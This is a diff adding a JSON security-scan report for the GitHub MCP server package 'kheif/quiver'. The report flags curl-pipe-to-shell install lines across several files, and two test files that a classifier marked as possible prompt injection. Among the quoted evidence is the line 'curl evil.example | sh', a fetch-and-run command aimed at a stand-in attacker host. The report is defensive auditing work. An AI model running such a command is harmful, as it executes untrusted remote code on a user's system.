@@ -1,0 +1,152 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "kheif/quiver",
+    "version": "882aef7d00333580f34666fd03ff3f2e0db60282",
+    "download": "https://codeload.github.com/kheif/quiver/tar.gz/882aef7d00333580f34666fd03ff3f2e0db60282"
+  },
+  "archive_sha256": "d18fbcb6ab99bec0ff16cda647f288d8f344d8c57e1726c159ce2b3e757cf01b",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "quiver-882aef7d00333580f34666fd03ff3f2e0db60282/internal/cli/sync_test.go",
+      "line": 272,
+      "evidence": "curl evil.example | sh",
+      "file_sha256": "e517f3fc4b0af35b434a5939317c71ffed20e04e05caa8422146c6de5929088d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "quiver-882aef7d00333580f34666fd03ff3f2e0db60282/internal/cli/notice.go",
+      "line": 115,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/kheif/quiver/main/install.sh | sh",
+      "file_sha256": "8f049e6a94d2a4bb7483d1fa55f0a35712181bcdf367bf89f96904b691788721"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "quiver-882aef7d00333580f34666fd03ff3f2e0db60282/internal/cli/notice_test.go",
+      "line": 68,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/kheif/quiver/main/install.sh | sh",
+      "file_sha256": "fb2edb22f12fc704302c45e7790a25b82abd5bff1fc6dbaaf16ef899fc5a842f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "quiver-882aef7d00333580f34666fd03ff3f2e0db60282/install.ps1",
+      "line": 29,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/kheif/quiver/main/install.sh | sh",
+      "file_sha256": "5a5a9c463d854c91369299b73b193c72088ad5b36d2cf367bfdc5eb2ea236c57"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "quiver-882aef7d00333580f34666fd03ff3f2e0db60282/web/src/data/install.json",
+      "line": 7,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/kheif/quiver/main/install.sh | sh",
+      "file_sha256": "e747d50227af24514c61df1c0bf851ccf95ad906ec3091e008151b68ef74f72b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "quiver-882aef7d00333580f34666fd03ff3f2e0db60282/web/src/content/docs/docs/installation.mdx",
+      "line": 23,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/kheif/quiver/main/install.sh | sh",
+      "file_sha256": "491e8e82f5b91c7f355c1548bb4c492bbb6b5c5d831e819c578a3bb666c72f82"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "quiver-882aef7d00333580f34666fd03ff3f2e0db60282/tasks/TASK32-release.md",
+      "line": 23,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/kheif/quiver/main/install.sh | sh",
+      "file_sha256": "8ad77922ec5ddcd1a867616b00a84a4ad32194076f0675487e6a99273afbc633"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "quiver-882aef7d00333580f34666fd03ff3f2e0db60282/install.sh",
+      "line": 4,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/kheif/quiver/main/install.sh | sh",
+      "file_sha256": "d820cbd06768e2556d60e52d74c2315398bddd35c645c30e31aa8912957ddf05"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "quiver-882aef7d00333580f34666fd03ff3f2e0db60282/README.md",
+      "line": 18,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/kheif/quiver/main/install.sh | sh",
+      "file_sha256": "61abad61317ab94edcae43e5b918dc950f6ff3c2e9a82d98a1365af16665da53"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "quiver-882aef7d00333580f34666fd03ff3f2e0db60282/testdata/formats/v1.5.0/local/notes/SKILL.md",
+      "line": 8,
+      "evidence": "p=0.96 Instructions go here.",
+      "file_sha256": "d393d291ed936e15d7771cd8eb82edcab0e0a57e4871f218f281f313e2f39c5b"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "quiver-882aef7d00333580f34666fd03ff3f2e0db60282/testdata/formats/v1.5.0/local/deploy/SKILL.md",
+      "line": 8,
+      "evidence": "p=0.96 Instructions go here.",
+      "file_sha256": "7a4aed893a621d73fe11b17375e22cce8837cba2cafa7c02efd1987345d19070"
+    }
+  ],
+  "flags": [
+    {
+      "severity": "low",
+      "id": "AGT-F-NEW-DOMAINS",
+      "summary": "Contacts domains the previous version did not",
+      "path": null,
+      "line": null,
+      "evidence": "127.0.0.1, example.invalid",
+      "file_sha256": null
+    }
+  ],
+  "domains": [
+    "127.0.0.1",
+    "anthropic.com",
+    "api.github.com",
+    "astro.build",
+    "example.com",
+    "example.dev",
+    "example.invalid",
+    "git.example.com",
+    "github.com",
+    "gitlab.com",
+    "kheif.github.io",
+    "opencollective.com",
+    "patreon.com",
+    "paulmillr.com",
+    "quiver.example",
+    "raw.githubusercontent.com",
+    "registry.npmjs.org",
+    "semver.org",
+    "starlight.astro.build",
+    "tidelift.com",
+    "www.apache.org",
+    "www.i18next.com",
+    "www.locize.com",
+    "www.npmjs.com",
+    "www.w3.org",
+    "x.dev"
+  ],
+  "install_script": false,
+  "score": "high"
+}
